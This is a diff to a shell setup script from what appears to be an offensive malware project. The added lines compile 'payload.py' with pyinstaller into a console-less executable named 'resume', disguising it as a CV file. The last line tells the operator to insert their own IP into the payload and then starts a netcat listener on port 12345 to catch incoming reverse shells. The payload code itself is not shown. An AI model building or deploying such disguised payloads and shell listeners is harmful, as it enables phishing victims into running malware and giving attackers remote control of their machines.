@@ -58,4 +58,13 @@ else
 fi
 echo "Setup complete."
 cd mailicous_server && npm install
+read -p "Enter y if you install payload as executable file else n: " answer
+
+while [[ "$answer" != "y" && "$answer" != "n" ]]; do
+    echo "Error: enter y or n..."
+    read -p "Enter y or n: " answer
+done
+if [[ "$answer" == "y" ]]; then
+    pyinstaller --onefile --noconsole --name resume ./payload.py
+fi
 clear && cd ~ && clear && echo "Do not forget to run the mailicous server and replace the ip address on payalod.py file with your ip adddress" && ipconfig eth0 && nc -lvnp 12345
